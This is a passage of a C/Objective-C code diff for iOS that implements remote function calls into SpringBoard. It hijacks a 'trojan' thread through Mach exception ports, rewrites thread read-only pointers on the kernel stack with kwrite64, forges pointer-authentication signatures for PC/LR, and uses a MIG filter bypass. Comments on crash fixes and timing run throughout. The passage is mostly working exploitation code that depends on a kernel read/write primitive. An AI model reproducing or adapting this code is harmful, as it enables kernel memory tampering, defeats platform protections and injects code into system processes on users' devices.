+                if (!is_kaddr_valid(tro)) {
+                    printf("[%s:%d] target thread tro invalid %#llx\n",
+                           __FUNCTION__, __LINE__, tro);
+                    continue;
+                }
+                kwrite64(trunc_page(kernelSP) + found, tro);
+                success = true;
+                break;
+            } else {
+                printf("[%s:%d] got empty tro, skip writing\n", __FUNCTION__, __LINE__);
+            }
+        } else {
+            NSLog(@"[%s:%d] didnt find tro for 0x%llx", __FUNCTION__, __LINE__, (uint64_t)currThread);
+        }
+    }
+
+    thread_set_mutex(g_RC_dummyThreadAddr, 0x40000000);
+
+    thread_set_exception_ports(g_RC_dummyThreadMach, 0, exceptionPort, EXCEPTION_STATE | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);
+
+    if(useMigFilterBypass)
+        usleep(100000);
+
+    mach_port_deallocate(mach_task_self_, machThread);
+    return success;
+}
+
+// Invoke mach thread op on remote targetThread without a target-task port.
+// Local helper calls fn(dummyMach, x1, x2, x3); while blocked we rewrite
+// dummy TRO on kstack to target TRO (same as set_exception_port_on_thread).
+// expectNearby: if non-zero, require that value at TRO+0x10 or +0x18 (arg check).
+static bool tro_swap_thread_op(uint64_t targetThread,
+                               void *fn,
+                               uint64_t x1, uint64_t x2, uint64_t x3,
+                               uint64_t expectNearby,
+                               const char *tag,
+                               bool useMigFilterBypass)
+{
+    if (!fn || !is_kaddr_valid(targetThread))
+        return false;
+    if (!g_RC_dummyThreadMach || !is_kaddr_valid(g_RC_dummyThreadAddr))
+        return false;
+
+    void *pthread_exit_addr = dlsym(RTLD_DEFAULT, "pthread_exit");
+    if (!pthread_exit_addr)
+        return false;
+
+    pthread_t pthread = NULL;
+    int createErr = pthread_create_suspended_np(&pthread, NULL, (void *(*)(void *))fn, NULL);
+    if (createErr != 0 || !pthread)
+        return false;
+
+    mach_port_t machThread = pthread_mach_thread_np(pthread);
+    if (!machThread) {
+        pthread_cancel(pthread);
+        return false;
+    }
+    uint64_t machThreadAddr = task_get_ipc_port_kobject(task_self(), machThread);
+    if (!is_kaddr_valid(machThreadAddr)) {
+        pthread_cancel(pthread);
+        mach_port_deallocate(mach_task_self_, machThread);
+        return false;
+    }
+
+    if (useMigFilterBypass)
+        mig_bypass_monitor_threads(g_RC_selfThreadAddr, machThreadAddr);
+
+    arm_thread_state64_internal helperState;
+    memset(&helperState, 0, sizeof(helperState));
+    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
+    if (thread_get_state(machThread, ARM_THREAD_STATE64,
+                         (thread_state_t)&helperState, &count) != KERN_SUCCESS) {
+        pthread_cancel(pthread);
+        mach_port_deallocate(mach_task_self_, machThread);
+        return false;
+    }
+
+    arm_thread_state64_set_pc_fptr(helperState, fn);
+    arm_thread_state64_set_lr_fptr(helperState, pthread_exit_addr);
+    helperState.__x[0] = g_RC_dummyThreadMach;
+    helperState.__x[1] = x1;
+    helperState.__x[2] = x2;
+    helperState.__x[3] = x3;
+
+    if (useMigFilterBypass)
+        usleep(100000);
+
+    if (!thread_set_state_wrapper(machThread, machThreadAddr, &helperState)) {
+        pthread_cancel(pthread);
+        mach_port_deallocate(mach_task_self_, machThread);
+        return false;
+    }
+
+    if (useMigFilterBypass)
+        usleep(100000);
+
+    thread_set_mutex(g_RC_dummyThreadAddr, g_RC_selfThreadCtid);
+
+    if (!thread_resume_wrapper(machThread)) {
+        pthread_cancel(pthread);
+        mach_port_deallocate(mach_task_self_, machThread);
+        return false;
+    }
+
+    bool success = false;
+    uint64_t needleVal = g_RC_dummyThreadTro;
+    for (int i = 0; i < 15; i++) {
+        usleep(100000);
+
+        uint64_t kstack = thread_get_kstackptr(machThreadAddr);
+        if (!is_kaddr_valid(kstack))
+            continue;
+        uint64_t kernelSP = kread64(kstack + off_arm_kernel_saved_state_sp);
+        if (!is_kaddr_valid(kernelSP))
+            continue;
+
+        uint64_t pageBase = trunc_page(kernelSP) + 0x3000ULL;
+        if (!is_kaddr_valid(pageBase))
+            continue;
+        char dataBuff[0x1000];
+        memset(dataBuff, 0, sizeof(dataBuff));
+        kreadbuf(pageBase, dataBuff, sizeof(dataBuff));
+
+        void *match = memmem(dataBuff, sizeof(dataBuff), &needleVal, sizeof(needleVal));
+        if (!match)
+            continue;
+        size_t foundOffset = (size_t)((uint8_t *)match - (uint8_t *)dataBuff);
+        uint64_t found = (uint64_t)foundOffset + 0x3000ULL;
+
+        if (expectNearby) {
+            uint64_t v1 = kread64(trunc_page(kernelSP) + found + 0x18ULL);
+            uint64_t v2 = kread64(trunc_page(kernelSP) + found + 0x10ULL);
+            if (v1 != expectNearby && v2 != expectNearby)
+                continue;
+        }
+
+        if (thread_get_task(targetThread) != g_RC_taskAddr)
+            continue;
+        uint64_t tro = thread_get_t_tro(targetThread);
+        if (!is_kaddr_valid(tro))
+            continue;
+        kwrite64(trunc_page(kernelSP) + found, tro);
+        success = true;
+        RC_DIAG("TRO %s: swapped %#llx", tag ? tag : "op", (unsigned long long)tro);
+        break;
+    }
+
+    // Match set_exception_port_on_thread: unlock dummy mutex and return.
+    // Do NOT pthread_join — on TRO miss the helper stays blocked in
+    // thread_suspend/set_state and join hangs forever (log 16:13: main @0x201
+    // WATCHDOG while parked waiting for this return).
+    thread_set_mutex(g_RC_dummyThreadAddr, 0x40000000);
+    if (useMigFilterBypass)
+        usleep(100000);
+    mach_port_deallocate(mach_task_self_, machThread);
+    if (!success)
+        RC_DIAG("TRO %s: failed to locate/swap TRO", tag ? tag : "op");
+    return success;
+}
+
+// Park remote thread at FAKE_PC/LR with no target-task port:
+// suspend → set_state(park) → resume (faults into secondExceptionPort).
+static bool park_remote_thread_via_tro_swap(uint64_t targetThread,
+                                            uint64_t signedPC,
+                                            uint64_t signedLR,
+                                            bool useMigFilterBypass)
+{
+    if (!is_kaddr_valid(targetThread)) {
+        RC_DIAG("TRO park: invalid target %#llx", (unsigned long long)targetThread);
+        return false;
+    }
+
+    void *thread_suspend_addr = dlsym(RTLD_DEFAULT, "thread_suspend");
+    void *thread_set_state_addr = dlsym(RTLD_DEFAULT, "thread_set_state");
+    void *thread_resume_addr = dlsym(RTLD_DEFAULT, "thread_resume");
+    if (!thread_suspend_addr || !thread_set_state_addr || !thread_resume_addr) {
+        RC_DIAG("TRO park: missing suspend/set_state/resume");
+        return false;
+    }
+
+    arm_thread_state64_internal park = {0};
+    park.__pc = signedPC;
+    park.__lr = signedLR;
+    park.__sp = g_RC_originalState.__sp;
+    park.__fp = g_RC_originalState.__fp;
+    park.__flags = g_RC_originalState.__flags;
+
+    arm_thread_state64_internal *stateBuf =
+        (arm_thread_state64_internal *)malloc(sizeof(park));
+    if (!stateBuf) {
+        RC_DIAG("TRO park: malloc stateBuf failed");
+        return false;
+    }
+    memcpy(stateBuf, &park, sizeof(park));
+
+    // Mark target as in-exception so set_state is accepted (same as wrapper).
+    uint16_t options = thread_get_options(targetThread);
+    thread_set_options(targetThread, (uint16_t)(options | TH_IN_MACH_EXCEPTION));
+
+    bool ok = tro_swap_thread_op(targetThread, thread_suspend_addr,
+                                 0, 0, 0, 0, "suspend", useMigFilterBypass);
+    if (!ok) {
+        RC_DIAG("TRO park: suspend failed");
+        thread_set_options(targetThread, options);
+        free(stateBuf);
+        return false;
+    }
+
+    ok = tro_swap_thread_op(targetThread, thread_set_state_addr,
+                            ARM_THREAD_STATE64,
+                            (uint64_t)(uintptr_t)stateBuf,
+                            ARM_THREAD_STATE64_COUNT,
+                            ARM_THREAD_STATE64,
+                            "set_state", useMigFilterBypass);
+    thread_set_options(targetThread, options);
+    if (!ok) {
+        RC_DIAG("TRO park: set_state failed — best-effort resume");
+        (void)tro_swap_thread_op(targetThread, thread_resume_addr,
+                                 0, 0, 0, 0, "resume_fail", useMigFilterBypass);
+        free(stateBuf);
+        return false;
+    }
+
+    ok = tro_swap_thread_op(targetThread, thread_resume_addr,
+                            0, 0, 0, 0, "resume", useMigFilterBypass);
+    free(stateBuf);
+    if (!ok) {
+        RC_DIAG("TRO park: resume failed");
+        return false;
+    }
+    return true;
+}
+
+void sign_state(uint64_t signingThread, arm_thread_state64_internal *state, uint64_t pc, uint64_t lr)
+{
+    reap_dead_port_names_if_needed("sign_state");
+
+    if(gIsPACSupported) {
+        uint64_t diver = 0;
+        diver = (uint64_t)state->__flags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
+        uint64_t discPC = ptrauth_blend_discriminator_wrapper(diver, ptrauth_string_discriminator_special("pc"));
+        uint64_t discLR = ptrauth_blend_discriminator_wrapper(diver, ptrauth_string_discriminator_special("lr"));
+
+        if (pc) {
+            uint32_t flags = state->__flags;
+            flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC;
+            state->__flags = flags;
+            state->__pc = remote_pac(signingThread, pc, discPC);
+        }
+        if (lr) {
+            uint32_t flags = state->__flags;
+            flags &= ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR |
+                       __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR);
+            state->__flags = flags;
+            state->__lr = remote_pac(signingThread, lr, discLR);
+        }
+        return;
+    }
+
+    if(!gIsPACSupported) {
+        if (pc) state->__pc = pc;
+        if (lr) state->__lr = lr;
+    }
+}
+
+bool remote_call_current_success(void)
+{
+    return g_RC_success;
+}
+
+int remote_call_current_pid(void)
+{
+    return g_RC_pid;
+}
+
+bool remote_call_uses_vphone_bridge(void)
+{
+    return g_RC_vphoneBridge;
+}
+
+int remote_call_set_stable_timeout_floor_ms(int timeoutMS)
+{
+    int previous = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 10000;
+    g_RC_stableExceptionTimeoutFloorMS = timeoutMS > 0 ? timeoutMS : 10000;
+    return previous;
+}
+
+uint64_t do_remote_call_temp(int timeout, const char *name,
+    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
+    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
+{
+    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
+    pthread_mutex_lock(&g_universal_ipc_mutex);
+    // A crossing poisoned by an earlier wait2 timeout still has a live thread
+    // behind it whose sentinel nobody reaped. Hijacking it now would resume it
+    // with a state from a different call, which is the way SpringBoard ends up
+    // executing an address nobody chose. Refuse rather than compound it.
+    if (g_RC_crossingPoisoned) {
+        RC_DIAG("temp/%s refused: crossing poisoned by an earlier wait2 timeout", name ?: "?");
+        pthread_mutex_unlock(&g_universal_ipc_mutex);
+        return 0;
+    }
+    uint64_t res = do_remote_call_temp_internal(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
+    pthread_mutex_unlock(&g_universal_ipc_mutex);
+    return res;
+}
+
+// dlsym(RTLD_DEFAULT, name) used to run on every single crossing, on both the
+// stable and the temp path. It takes dyld's global lock and walks the export
+// trie of every loaded image, and a publish makes 8 to 18 crossings, so it was
+// paid eight to eighteen times a frame to look up the same four or five names
+// over and over. The overlay only ever calls CGPathCreateMutable,
+// CGPathAddRects, CGPathAddLines, CGPathRelease, malloc and free.
+//
+// [SB-CALL] is what makes the size of that visible. Its w1, pac and w2 timers
+// start after this line, so dlsym was never inside them; it fell into rest,
+// which read 2.2ms per call against 0.33ms of measured transport.
+//
+// The selector and class caches in remote_objc.m are keyed by target pid,
+// because a selector value is a property of the target. A C symbol is a
+// property of this process, so this one needs no pid and no invalidation: the
+// address dlsym returns is valid for the life of the process. Like those
+// caches, it is a flat array with a rolling index and no eviction policy, at 48
+// entries, which is more than twice what the whole drawing path needs.
+#define RC_LSYM_SLOTS 48
+#define RC_LSYM_NAMELEN 64
+static struct { char name[RC_LSYM_NAMELEN]; uint64_t addr; } g_lsymCache[RC_LSYM_SLOTS];
+static int g_lsymNext = 0;
+static pthread_mutex_t g_lsymLock = PTHREAD_MUTEX_INITIALIZER;
+
+static uint64_t rc_local_sym(const char *name) {
+    if (!name) return 0;
+    pthread_mutex_lock(&g_lsymLock);
+    for (int i = 0; i < RC_LSYM_SLOTS; i++) {
+        if (g_lsymCache[i].addr && strcmp(g_lsymCache[i].name, name) == 0) {
+            uint64_t a = g_lsymCache[i].addr;
+            pthread_mutex_unlock(&g_lsymLock);
+            return a;
+        }
+    }
+    pthread_mutex_unlock(&g_lsymLock);
+
+    // Missed, so resolve outside the lock. dlsym can be slow and holding the
+    // lock across it would serialise every crossing behind it.
+    const uint64_t addr = native_strip((uint64_t)dlsym(RTLD_DEFAULT, name));
+    if (addr) {
+        pthread_mutex_lock(&g_lsymLock);
+        strncpy(g_lsymCache[g_lsymNext].name, name, RC_LSYM_NAMELEN - 1);
+        g_lsymCache[g_lsymNext].name[RC_LSYM_NAMELEN - 1] = '\0';
+        g_lsymCache[g_lsymNext].addr = addr;
+        g_lsymNext = (g_lsymNext + 1) % RC_LSYM_SLOTS;
+        pthread_mutex_unlock(&g_lsymLock);
+    }
+    return addr;
+}
+
+uint64_t do_remote_call_temp_internal(int timeout, const char *name,
+    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
+    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
+{
+    int floorTimeout = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 10000;
+    int newTimeout = (floorTimeout > timeout) ? floorTimeout : timeout;
+    uint64_t pcAddr = rc_local_sym(name);
+
+    ExceptionMessage exc;
+    if (!wait_exception(g_RC_firstExceptionPort, &exc, newTimeout, false)) {
+        RC_DIAG("temp/%s wait1 MISS timeout=%d (missed creator 0x101 → likely SIGBUS 0x201)",
+                name ?: "?", newTimeout);
+        g_RC_success = false;
+        return 0;
+    }
+    RC_DIAG("temp/%s wait1 PC=0x%llx LR=0x%llx (expect 0x101 if post-creator)",
+            name ?: "?",
+            (unsigned long long)native_strip(exc.threadState.__pc),
+            (unsigned long long)native_strip(exc.threadState.__lr));
+
+    // Never reply onto a state that isn't a live faulted thread. Replying with
+    // a real function pointer + FAKE_LR onto a bogus state resumes a thread
+    // with sp=0 and gets the *target process* SIGKILLed
+    // (SpringBoard IPS 2026-09-26 06:21:04, CODESIGNING "Invalid Page").
+    if (!exception_state_is_sane(&exc)) {
+        RC_DIAG("temp/%s wait1 REJECT non-live state (pc=0x%llx sp=0x%llx flavor=%u) — not replying",
+                name ?: "?",
+                (unsigned long long)native_strip(exc.threadState.__pc),
+                (unsigned long long)native_strip(exc.threadState.__sp),
+                (unsigned)exc.flavor);
+        g_RC_success = false;
+        return 0;
+    }
+
+    exc.threadState.__x[0] = x0;
+    exc.threadState.__x[1] = x1;
+    exc.threadState.__x[2] = x2;
+    exc.threadState.__x[3] = x3;
+    exc.threadState.__x[4] = x4;
+    exc.threadState.__x[5] = x5;
+    exc.threadState.__x[6] = x6;
+    exc.threadState.__x[7] = x7;
+    sign_state(g_RC_trojanThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN_CREATOR);
+    reply_with_state(&exc, &exc.threadState);
+
+    if (timeout < 0) {
+        printf("[%s:%d] Trojan thread cleanup\n", __FUNCTION__, __LINE__);
+        return 0;
+    }
+
+    ExceptionMessage exc2;
+    if (!wait_exception(g_RC_firstExceptionPort, &exc2, newTimeout, false)) {
+        RC_DIAG("temp/%s wait2 MISS (RET to FAKE_LR 0x201 uncaught?)", name ?: "?");
+        g_RC_success = false;
+        return 0;
+    }
+    RC_DIAG("temp/%s wait2 PC=0x%llx LR=0x%llx ret=0x%llx",
+            name ?: "?",
+            (unsigned long long)native_strip(exc2.threadState.__pc),
+            (unsigned long long)native_strip(exc2.threadState.__lr),
+            (unsigned long long)exc2.threadState.__x[0]);
+    uint64_t retValue = exc2.threadState.__x[0];
+    reply_with_state(&exc2, &exc2.threadState);
+    if (remote_call_should_log_result(name, false))
+        printf("[%s:%d] %s func's retValue = 0x%llx(%llu)\n", __FUNCTION__, __LINE__, name, retValue, retValue);
+    if(strcmp(name, "getpid") == 0 && retValue == 0) {
+        printf("[%s:%d] getpid failed\n", __FUNCTION__, __LINE__);
+        g_RC_success = false;
+    }
+    return retValue;
+}
+
+uint64_t do_remote_call_stable(int timeout, const char *name,
+    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
+    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
+{
+    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
+    pthread_mutex_lock(&g_universal_ipc_mutex);
+    uint64_t res = 0;
+    if (g_RC_vphoneBridge) {
+        if (timeout >= 0)
+            res = rc_vphone_bridge_call(2, 0, name, x0, x1, x2, x3, x4, x5, x6, x7);
+        pthread_mutex_unlock(&g_universal_ipc_mutex);
+        return res;
+    }
+
+    // Same refusal as do_remote_call_temp, and it has to be here too: this is the
+    // entry every publish goes through once an extra thread exists. The
+    // vphoneBridge branch above is the one case with no trojan thread to poison, so
+    // the latch is necessarily clear there.
+    if (g_RC_crossingPoisoned) {
+        RC_DIAG("stable/%s refused: crossing poisoned by an earlier wait2 timeout", name ?: "?");
+        pthread_mutex_unlock(&g_universal_ipc_mutex);
+        return 0;
+    }
+
+    if (!g_RC_creatingExtraThread) {
+        res = do_remote_call_temp_internal(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
+        pthread_mutex_unlock(&g_universal_ipc_mutex);
+        return res;
+    }
+
+    // MUST strip PAC bits from local dlsym before remote_pac re-signs for the
+    // target thread. Leaving a locally-signed pointer here makes remote_pac
+    // produce a bad LR/PC; SpringBoard then RET to raw FAKE_LR 0x401 without
+    // our exception port catching it → SIGBUS 0x401 (seen in IPS).
+    uint64_t pcAddr = rc_local_sym(name);
+    if (!pcAddr) {
+        printf("[%s:%d] Unable to find symbol: %s\n", __FUNCTION__, __LINE__, name);
+        g_RC_success = false;
+        pthread_mutex_unlock(&g_universal_ipc_mutex);
+        return 0;
+    }
+    res = do_remote_call_stable_addr_internal(timeout, pcAddr, name, x0, x1, x2, x3, x4, x5, x6, x7);
+    pthread_mutex_unlock(&g_universal_ipc_mutex);
+    return res;
+}
+
+uint64_t do_remote_call_stable_addr(int timeout, uint64_t pcAddr, const char *name,
+    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
+    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
+{
+    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
+    pthread_mutex_lock(&g_universal_ipc_mutex);
+    // The other two entry points refuse when the crossing is poisoned and this one
+    // did not, which is a hole in the latch rather than a deliberate exemption.
+    if (g_RC_crossingPoisoned) {
+        RC_DIAG("stable-addr/%s refused: crossing poisoned by an earlier wait2 timeout",
+                name ?: "?");
+        pthread_mutex_unlock(&g_universal_ipc_mutex);
+        return 0;
+    }
+    uint64_t res = do_remote_call_stable_addr_internal(timeout, pcAddr, name, x0, x1, x2, x3, x4, x5, x6, x7);
+    pthread_mutex_unlock(&g_universal_ipc_mutex);
+    return res;
+}
+
+// A wait2 timeout means the trojan thread was resumed with LR = FAKE_LR_TROJAN,
+// which is 0x401, and its sentinel return has not come back yet. Returning failure
+// and walking away leaves two possibilities undifferentiated: the remote function
+// was merely slow and the fault is still coming with nobody there to read it, or
+// the fault arrived and something else consumed it.
+//
+// Either way the crossing is out of step with the port queue. The next call waits
+// on firstExceptionPort for the exception its own reply will produce, but the queue
+// holds this call's leftovers, so it hijacks the thread with a state belonging to a
+// different call. That is how a thread comes to execute an address nobody picked,
+// and the resulting fault is not a sentinel, so the port that catches sentinels
+// does not recognise it and SpringBoard takes an unhandled EXC_BAD_ACCESS. The
+// three crash reports from this machine are exactly that shape: PC = LR = 0x401 in
+// the injected image, which is this design's own sentinel, arriving uncaught.
+//
+// So reap the late exception if it is merely late and put the thread back on the
+// canonical park -- the same FAKE_PC_TROJAN state init parks in, which re-faults at
+// 0x301 and blocks, and blocked-on-a-sentinel is the resting state every later
+// crossing expects to find.
+//
+// Returning false is not fatal on its own. The ports stay armed either way, so a
+// sentinel fault that turns up late is still caught rather than escalated.
+static bool rc_resync_trojan_after_wait2_timeout(const char *name)
+{
+    ExceptionMessage late;
+    // Deliberately short. This runs on a path that already burned newTimeout while
+    // holding the IPC mutex, and another long wait would stall every publisher.
+    if (!wait_exception(g_RC_secondExceptionPort, &late, 2000, false)) {
+        RC_DIAG("resync/%s no late exception, thread left on its sentinel (ports stay armed)",
+                name ?: "?");
+        return false;
+    }
+    // Replying with the state unchanged re-runs the faulting instruction and spins.
+    // Replying with the park re-faults at 0x301 and the thread blocks there.
+    // {} rather than {0}: -Wmissing-braces is an error under this gate's flags,
+    // and the two existing park initialisers in this file are why it is tolerated
+    // at all. Not adding a third.
+    arm_thread_state64_internal park = {};
+    park.__sp    = g_RC_originalState.__sp;
+    park.__fp    = g_RC_originalState.__fp;
+    park.__flags = late.threadState.__flags;
+    sign_state(g_RC_trojanThreadAddr, &park, FAKE_PC_TROJAN, FAKE_LR_TROJAN);
+    reply_with_state(&late, &park);
+    RC_DIAG("resync/%s reparked at 0x301 after wait2 timeout", name ?: "?");
+    return true;
+}
+
+uint64_t do_remote_call_stable_addr_internal(int timeout, uint64_t pcAddr, const char *name,
+    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
+    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
+{
+    if (g_RC_vphoneBridge) {
+        if (timeout < 0) return 0;
+        if (rc_vphone_bridge_unsafe_addr_call_name(name)) {
+            printf("[VPHONE-BRIDGE] blocked unsafe addr-call name=%s addr=%#llx\n",
+                   name ?: "(null)", pcAddr);
+            g_RC_success = false;
+            return 0;
+        }
+        return rc_vphone_bridge_call(3, pcAddr, name, x0, x1, x2, x3, x4, x5, x6, x7);
+    }
+
+    if (!g_RC_creatingExtraThread)
+        return 0;
+
+    if (!pcAddr) {
+        printf("[%s:%d] NULL function pointer: %s\n", __FUNCTION__, __LINE__, name ?: "(addr-call)");
+        g_RC_success = false;
+        return 0;
+    }
+    // Addr-call sites may pass a still-signed pointer; strip before re-sign.
+    pcAddr = native_strip(pcAddr);
+    int floorTimeout = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 10000;
+    int newTimeout = (floorTimeout > timeout) ? floorTimeout : timeout;
+
+    ExceptionMessage exc;
+    // The wait1 begin and wait1 caught traces used to be unconditional NSLogs
+    // here, and the wait2 pair had the same two. One successful call printed
+    // four of them and a publish makes 7 to 11 calls, so 28 to 44 synchronous
+    // NSLogs per publish, each formatting into a 1KB buffer and going out
+    // through os_log. NSLog is a write, not a memcpy, and it is the reason
+    // [SB-CALL] showed the crossings at a third of a millisecond each while the
+    // wall clock per call was two and a half.
+    //
+    // Deleted rather than gated. A gate needs an environment lookup or a new
+    // global, and either adds state to the one function that must not gain any:
+    // this is where the mutex lives that every crossing in the process
+    // serialises behind. A diagnostic that cannot pay for itself is not worth a
+    // branch here.
+    //
+    // Nothing was lost. Every fault case on this path is still unconditional:
+    // wait1 TIMEOUT, wait1 REJECT non-live state, wait2 TIMEOUT, and the
+    // restore_trojan_thread lines.
+    const uint64_t tCallStart = rc_now_us();
+    if (!wait_exception(g_RC_secondExceptionPort, &exc, newTimeout, false)) {
+        RC_DIAG("stable/%s wait1 TIMEOUT (new thread didn't hit 0x301 park?)", name ?: "(addr-call)");
+        printf("[%s:%d] Don't receive first exception on new thread\n", __FUNCTION__, __LINE__);
+        g_RC_success = false;
+        return 0;
+    }
+
+    // This is the guard that saved SpringBoard on 2026-09-26: the port handed us
+    // an all-zero state, and we used to sign pc=<real fn>/lr=0x401 onto it and
+    // reply. getpid then ran (leaf, no stack needed) and RET 0x401 aborted the
+    // process with SIGKILL / CODESIGNING "Invalid Page". A zeroed state is never
+    // the parked 0x301 thread — drop the session instead of replying.
+    if (!exception_state_is_sane(&exc)) {
+        RC_DIAG("stable/%s wait1 REJECT non-live state (pc=0x%llx sp=0x%llx flavor=%u) — not replying",
+                name ?: "(addr-call)",
+                (unsigned long long)native_strip(exc.threadState.__pc),
+                (unsigned long long)native_strip(exc.threadState.__sp),
+                (unsigned)exc.flavor);
+        g_RC_success = false;
+        return 0;
+    }
+
+    exc.threadState.__x[0] = x0;
+    exc.threadState.__x[1] = x1;
+    exc.threadState.__x[2] = x2;
+    exc.threadState.__x[3] = x3;
+    exc.threadState.__x[4] = x4;
+    exc.threadState.__x[5] = x5;
+    exc.threadState.__x[6] = x6;
+    exc.threadState.__x[7] = x7;
+    // Cyanide/Fl0rk: ALWAYS sign with trojanThreadAddr (PAC gadget context),
+    // even though the exception arrives on the synthetic call thread.
+    // Signing with callThreadAddr produced uncatchable RET→0x401 SIGBUS.
+    const uint64_t tW1Done = rc_now_us();
+    sign_state(g_RC_trojanThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN);
+    const uint64_t tSignDone = rc_now_us();
+    reply_with_state(&exc, &exc.threadState);
+
+    if (timeout < 0) {
+        printf("[%s:%d] Trojan thread cleanup\n", __FUNCTION__, __LINE__);
+        return 0;
+    }
+
+    ExceptionMessage exc2;
+    if (!wait_exception(g_RC_secondExceptionPort, &exc2, newTimeout, false)) {
+        RC_DIAG("stable/%s wait2 TIMEOUT", name ?: "(addr-call)");
+        printf("[%s:%d] Don't receive second exception on new thread (name=%s) — resync\n",
+               __FUNCTION__, __LINE__, name ?: "(addr-call)");
+        // The thread was resumed with LR = 0x401. It must not be left holding an
+        // exception nobody will read, and the queue must not be left holding a
+        // result the next call will mistake for its own. Reap and re-park if the
+        // fault is only late; otherwise latch the crossing so that nothing hijacks
+        // the thread again out of step. See rc_resync_trojan_after_wait2_timeout.
+        if (!rc_resync_trojan_after_wait2_timeout(name)) {
+            g_RC_crossingPoisoned = true;
+            // The thread is STILL on the sentinel, so the ports have to stay.
+            //
+            // This latch was only being set by fail_after_creator_park, which is an
+            // init-failure helper that this path never goes near -- so a session
+            // poisoned here looked un-wedged to everything downstream. And the very
+            // next thing such a session does is give up: after three consecutive
+            // failures SpringBoardOverlay.m calls abandon_remote_call(), which
+            // destroys both exception ports. That is the crash, exactly -- a live
+            // thread in SpringBoard sitting on LR = 0x401 with the catcher removed,
+            // which is the fault every report shows, and it is why
+            // consecutiveCrashCount kept climbing after the previous fix stopped
+            // the next hijack.
+            g_RC_wedgeKeepPorts = true;
+        }
+        // From here it is best-effort.
+        g_RC_success = false;
+        return 0;
+    }
+    uint64_t retValue = exc2.threadState.__x[0];
+    // Re-park: reply keeps thread blocked in exception until next hijack.
+    reply_with_state(&exc2, &exc2.threadState);
+    rc_note_call_cost(tCallStart, tW1Done, tSignDone);
+    if (remote_call_should_log_result(name, true))
+        printf("[%s:%d] %s func's retValue = 0x%llx(%llu)\n", __FUNCTION__, __LINE__, name ?: "(addr-call)", retValue, retValue);
+    return retValue;
+}
+
+bool restore_trojan_thread(arm_thread_state64_internal *state)
+{
+    ExceptionMessage exc;
+    int restoreTimeoutMS = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 20000;
+    if (restoreTimeoutMS < 1000) restoreTimeoutMS = 1000;
+    RC_DIAG("restore_trojan_thread waiting firstExceptionPort timeout=%dms", restoreTimeoutMS);
+    if (!wait_exception(g_RC_firstExceptionPort, &exc, restoreTimeoutMS, false)) {
+        RC_DIAG("restore_trojan_thread wait TIMEOUT %dms", restoreTimeoutMS);
+        printf("[%s:%d] Failed to receive exception while restoring within %dms\n",
+               __FUNCTION__, __LINE__, restoreTimeoutMS);
+        return false;
+    }
+
+    RC_DIAG("restore_trojan_thread caught excPC=0x%llx excLR=0x%llx — restoring original PC=0x%llx LR=0x%llx",
+            (unsigned long long)native_strip(exc.threadState.__pc),
+            (unsigned long long)native_strip(exc.threadState.__lr),
+            (unsigned long long)native_strip(state->__pc),
+            (unsigned long long)native_strip(state->__lr));
+    state->__flags = exc.threadState.__flags;
+    sign_state(g_RC_trojanThreadAddr, state, state->__pc, state->__lr);
+    reply_with_state(&exc, state);
+    RC_DIAG("restore_trojan_thread reply sent — original thread resumed");
+    return true;
+}
+
+void abandon_remote_call(void) {
+    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
+    pthread_mutex_lock(&g_universal_ipc_mutex);
+    abandon_remote_call_internal();
+    pthread_mutex_unlock(&g_universal_ipc_mutex);
+}
+
+// After creator reply parks the hijacked thread at FAKE_PC 0x101, any fail
+// path MUST restore original state before tearing local ports down. Calling
+// abandon alone leaves SpringBoard (often main) stuck at 0x101 → WATCHDOG.
+static void fail_after_creator_park(RemoteCallInitFailure why, int targetPid)
+{
+    remote_call_note_init_failure(why, targetPid);
+    bool wedged = false;
+    if (g_RC_trojanThreadAddr && g_RC_firstExceptionPort) {
+        if (!restore_trojan_thread(&g_RC_originalState)) {
+            printf("[%s:%d] restore after FAKE_PC park failed — SB may WATCHDOG\n",
+                   __FUNCTION__, __LINE__);
+            wedged = true;
+        }
+    }
+    // abandon_remote_call() destroys both exception ports. When the restore above
+    // failed there is still a live thread inside SpringBoard, still parked on one of
+    // our sentinels, and those two ports are the only thing between it and an
+    // unhandled EXC_BAD_ACCESS -- which is a dead SpringBoard, not a watchdog.
+    //
+    // Destroying the receive right is enough to cause that even though the kernel
+    // keeps the port object alive: SpringBoard holds a reference to it, so the port
+    // does not die, but with no receive right left there is nowhere to deliver the
+    // exception. The kernel then treats it as unhandled and the thread takes a
+    // SIGBUS. Three crash reports from this machine are that fault, at PC = 0x401,
+    // the sentinel this thread is parked on.
+    //
+    // So latch it. A wedged thread costs a watchdog on the next respawn; taking the
+    // catcher away costs the process the overlay is drawn in.
+    g_RC_wedgeKeepPorts = wedged;
+    if (wedged) {
+        printf("[%s:%d] trojan thread wedged on a sentinel — KEEPING both exception ports armed\n",
+               __FUNCTION__, __LINE__);
+    }
